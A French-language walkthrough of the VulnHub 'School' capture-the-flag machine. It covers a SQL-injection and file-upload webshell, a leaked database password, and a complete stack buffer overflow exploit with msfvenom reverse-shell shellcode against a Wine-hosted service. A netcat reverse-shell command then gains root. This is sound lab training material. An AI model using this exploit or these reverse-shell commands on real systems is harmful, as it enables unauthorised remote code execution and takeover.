# Solution du CTF School de VulnHub

Et voici un dernier CTF fait par *foxlox* : [School](https://www.vulnhub.com/entry/school-1,613/). La description semble assez proche de [Netstart ](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Netstart%20de%20VulnHub.md) que j'ai solutionné quelques heures plus tôt :

> This is a Linux box, running a Web Application, and a Windows application in WINE environment to give Access to Wine from Linux.

La VM a trois ports ouverts et là encore un des ports semble custom : le 23 qui ne réagit pas comme un telnet classique.

```
Nmap scan report for 192.168.56.51
Host is up (0.00023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 deb52389bb9fd41ab50453d0b75cb03f (RSA)
|   256 160914eab9fa17e945395e3bb4fd110a (ECDSA)
|_  256 9f665e71b9125ded705a4f5a8d0d65d5 (ED25519)
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, ms-sql-s, oracle-tns, tn3270: 
|_    Verification Code:
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-title: 404 Not Found
|_Requested resource was login.php
|_http-server-header: Apache/2.4.38 (Debian)
```

## The Faculty

Quand on se rend sur le site web on est redirigé vers un script `/student_attendance/login.php`

Le code source ne divulge pas de méta données concernant le logiciel mais une simple recherche sur exploit-db remonte [un exploit](https://www.exploit-db.com/exploits/48989) utilisant deux vulnérabilités :

* bypass d'authentification via faille SQL sur le formulaire de login

* upload de fichier non restreint

qui peuvent être utilisées pour obtenir une exécution de code distante.

Le code n'est pas très fouillé, il faut éditer les URLs dans le code et placer dans le dossier courant un fichier `shell.php` qui sera uploadé sur le site web.

J'ai tenté d'abord de faire l'exploitation à la main. Tout est ok pour la partie SQL en revanche je n'ai croisé aucun mécanisme d'upload en naviguant sur le site. L'exploit utilise peut être une fonctionnalité un peu dissimulée (le script ciblé se nomme `ajax.php`).

Dans tous les cas, après utilisation de l'exploit j'obtiens un webshell à cette adresse :

http://192.168.56.51/student_attendance/assets/uploads/1667940180_shell.php?cmd=id

Un upload de reverse-ssh plus tard et je suis mon parcours de santé tel que trouver les identifiants de la BDD :

```php
www-data@school:/var/www/html/student_attendance$ cat db_connect.php 
<?php 

$conn= new mysqli('localhost','fox','trallalleropititumpa','student_attendance_db')or die("Could not connect to mysql".mysqli_error($con));
```

Obtenir le premier flag :

```shellsession
www-data@school:/home/fox$ cat local.txt 
e4ed03b4852906b6cb716fc6ce0f9fd5
```

Découvrir la suite des opérations en regardant les processus :

```
root       349  0.0  0.0   2388   760 ?        S    20:29   0:00 /bin/sh /root/win
root       351  0.0  0.6 2632452 6672 ?        S    20:29   0:00 /opt/access/access.exe
root       387  0.0  0.5   8192  5280 ?        Ss   20:29   0:00 /usr/lib/wine/wineserver32 -p0
root       480  0.0  0.6 2633684 6160 ?        Ssl  20:29   0:00 C:\windows\system32\services.exe
root       504  0.0  0.6 2636308 6760 ?        Sl   20:29   0:00 C:\windows\system32\winedevice.exe
root       558  0.0  0.5 2632388 5572 ?        Sl   20:29   0:00 C:\windows\system32\plugplay.exe
root       586  0.3  1.3 2650608 13448 ?       Sl   20:29   0:07 C:\windows\system32\winedevice.exe
```

Au vue des ports ouverts et services qui tournent (80 pour Apache, 3306 pour MySQL, 631 pour CUPS, 22 pour SSH) on peut confirmer que c'est bien l'exécutable Windows lancé via Wine qui utilise le port 23.

```shellsession
www-data@school:/var/www/html$ ss -lntp
State                       Recv-Q                       Send-Q                                             Local Address:Port                                             Peer Address:Port                      
LISTEN                      0                            80                                                     127.0.0.1:3306                                                  0.0.0.0:*                         
LISTEN                      0                            128                                                      0.0.0.0:80                                                    0.0.0.0:*                         
LISTEN                      0                            128                                                      0.0.0.0:22                                                    0.0.0.0:*                         
LISTEN                      0                            5                                                      127.0.0.1:631                                                   0.0.0.0:*                         
LISTEN                      0                            128                                                      0.0.0.0:23                                                    0.0.0.0:*
```

Le fichier est accompagné d'une DLL :

```shellsession
www-data@school:/$ ls -l /opt/access/
total 80
-rw-r--r-- 1 root root 51019 Nov  7  2020 access.exe
-rw-r--r-- 1 root root 28613 Nov  7  2020 funcs_access.dll
```

## Copier Coller

Je n'entrerais pas dans les détails du reverse-engineering sur ce CTF car le binaire est quasiment le même que sur Netstart. La vérification des mauvais caractères différe :

```
0x4d 0x4f 0x5f 0x79 0x7e 0x7f
```

La fonction vulnérable (qui a le même nom) a une stack plus grande :

```nasm
_f3 (char *arg_8h);
; var char *dest @ ebp-0x76a
; arg char *arg_8h @ ebp+0x8
; var const char *src @ esp+0x4
0x004018ce      push ebp
0x004018cf      mov ebp, esp
0x004018d1      sub esp, 0x788
0x004018d7      mov eax, dword [arg_8h]
0x004018da      mov dword [src], eax ; const char *src
0x004018de      lea eax, [dest]
0x004018e4      mov dword [esp], eax ; char *dest
0x004018e7      call _strcpy       ; sym._strcpy ; char *strcpy(char *dest, const char *src)
0x004018ec      nop
0x004018ed      leave
0x004018ee      ret
```

Ici 1898 (0x76a) octets sont réservés pour le buffer suvi par les sauvegardes de EBP et EIP.

Pour le vérifier on peut envoyer des données qui devraient se caler parfaitement sur les registres :

```python
import socket

sock = socket.socket()
sock.connect(('127.0.0.1', 2323))
buff = b"A" * 1898 + b"BBBBCCCC" + b"D" * 1024
sock.send(buff)
sock.close()
```

Et ça marche, comme l'indique l'outil de gestion de crash de Wine :

```
Unhandled exception: page fault on read access to 0x43434343 in 32-bit code (0x43434343).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:0063 GS:006b
 EIP:43434343 ESP:0135fb08 EBP:42424242 EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:0135f396 EBX:00000040 ECX:0135f396 EDX:00000000
 ESI:00000000 EDI:00000000
Stack dump:
0x0135fb08:  44444444 44444444 44444444 44444444
0x0135fb18:  44444444 44444444 44444444 44444444
0x0135fb28:  44444444 44444444 44444444 44444444
0x0135fb38:  44444444 44444444 44444444 44444444
0x0135fb48:  44444444 44444444 44444444 44444444
0x0135fb58:  44444444 44444444 44444444 44444444
```

Tout comme le précédent CTF du même auteur, ESP pointe sur les octets après l'adresse de retour.

On a besoin d'une adresse valide pour écraser EIP. On peut trouver un `jmp esp` dans l'exécutable mais son adresse contient un octet nul. C'est là qu'entre en jeux la DLL qui est chargée par le binaire :

```shellsession
$ python ROPgadget.py --binary /tmp/funcs_access.dll | grep "jmp esp"
0x625012d0 : jmp esp
0x625012ce : mov ebp, esp ; jmp esp
0x625012cd : push ebp ; mov ebp, esp ; jmp esp
```

On a notre adresse de retour, maintenant utilisons `msfvenom` pour générer notre shellcode sans les mauvais caractères.

```bash
msfvenom -a x86 -b '\x4d\x4f\x5f\x79\x7e\x7f\x00' -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 --format python
```

Voici l'exploit :

```python
import socket

# msfvenom -a x86 -b '\x4d\x4f\x5f\x79\x7e\x7f\x00' -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 --format python
buf =  b""
buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x96\xa4\x58\xba\x83\xee\xfc\xe2\xf4\x6a\x4c"
buf += b"\xda\xba\x96\xa4\x38\x33\x73\x95\x98\xde\x1d\xf4\x68"
buf += b"\x31\xc4\xa8\xd3\xe8\x82\x2f\x2a\x92\x99\x13\x12\x9c"
buf += b"\xa7\x5b\xf4\x86\xf7\xd8\x5a\x96\xb6\x65\x97\xb7\x97"
buf += b"\x63\xba\x48\xc4\xf3\xd3\xe8\x86\x2f\x12\x86\x1d\xe8"
buf += b"\x49\xc2\x75\xec\x59\x6b\xc7\x2f\x01\x9a\x97\x77\xd3"
buf += b"\xf3\x8e\x47\x62\xf3\x1d\x90\xd3\xbb\x40\x95\xa7\x16"
buf += b"\x57\x6b\x55\xbb\x51\x9c\xb8\xcf\x60\xa7\x25\x42\xad"
buf += b"\xd9\x7c\xcf\x72\xfc\xd3\xe2\xb2\xa5\x8b\xdc\x1d\xa8"
buf += b"\x13\x31\xce\xb8\x59\x69\x1d\xa0\xd3\xbb\x46\x2d\x1c"
buf += b"\x9e\xb2\xff\x03\xdb\xcf\xfe\x09\x45\x76\xfb\x07\xe0"
buf += b"\x1d\xb6\xb3\x37\xcb\xcc\x6b\x88\x96\xa4\x30\xcd\xe5"
buf += b"\x96\x07\xee\xfe\xe8\x2f\x9c\x91\x5b\x8d\x02\x06\xa5"
buf += b"\x58\xba\xbf\x60\x0c\xea\xfe\x8d\xd8\xd1\x96\x5b\x8d"
buf += b"\xea\xc6\xf4\x08\xfa\xc6\xe4\x08\xd2\x7c\xab\x87\x5a"
buf += b"\x69\x71\xcf\xd0\x93\xcc\x98\x12\xae\xa5\x30\xb8\x96"
buf += b"\xb5\x04\x33\x70\xce\x48\xec\xc1\xcc\xc1\x1f\xe2\xc5"
buf += b"\xa7\x6f\x13\x64\x2c\xb6\x69\xea\x50\xcf\x7a\xcc\xa8"
buf += b"\x0f\x34\xf2\xa7\x6f\xfe\xc7\x35\xde\x96\x2d\xbb\xed"
buf += b"\xc1\xf3\x69\x4c\xfc\xb6\x01\xec\x74\x59\x3e\x7d\xd2"
buf += b"\x80\x64\xbb\x97\x29\x1c\x9e\x86\x62\x58\xfe\xc2\xf4"
buf += b"\x0e\xec\xc0\xe2\x0e\xf4\xc0\xf2\x0b\xec\xfe\xdd\x94"
buf += b"\x85\x10\x5b\x8d\x33\x76\xea\x0e\xfc\x69\x94\x30\xb2"
buf += b"\x11\xb9\x38\x45\x43\x1f\xa8\x0f\x34\xf2\x30\x1c\x03"
buf += b"\x19\xc5\x45\x43\x98\x5e\xc6\x9c\x24\xa3\x5a\xe3\xa1"
buf += b"\xe3\xfd\x85\xd6\x37\xd0\x96\xf7\xa7\x6f"

jmp_esp = b"\xd0\x12\x50\x62"

buffer = b"A"*1898 + b"BBBB" + jmp_esp + b"\x90" * 32 + buf
sock = socket.socket()
sock.connect(("192.168.56.51", 23))
sock.recv(1024)
sock.send(buffer + b"\r\n")
sock.close()
```

Avec ça je peux recevoir mon reverse shell et j'échape immédiatement du Wine pour créer un autre reverse shell (Linux cette fois) :

```shellsession
$ ncat -l -p 4444 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.51.
Ncat: Connection from 192.168.56.51:33480.
Microsoft Windows 6.1.7601 (4.0)

Z:\> start /unix /bin/nc.traditional -e /bin/sh 192.168.56.1 7777
```

```shellsession
$ ncat -l -p 7777 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 192.168.56.51.
Ncat: Connection from 192.168.56.51:40212.
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@school:/root# ls
proof.txt  win
root@school:/root# cat proof.txt
ccc34dede451108a8fe6f75d6ea7d2ae
```

Oups, c'était rapide ! Je n'avais pas fait attention que le process tournait en root (j'aurais du tilter au numéro de port).

CTF d'autant plus rapide que je n'ai eu qu'à adapter l'exploit déjà existant et survoler la partie de RE.
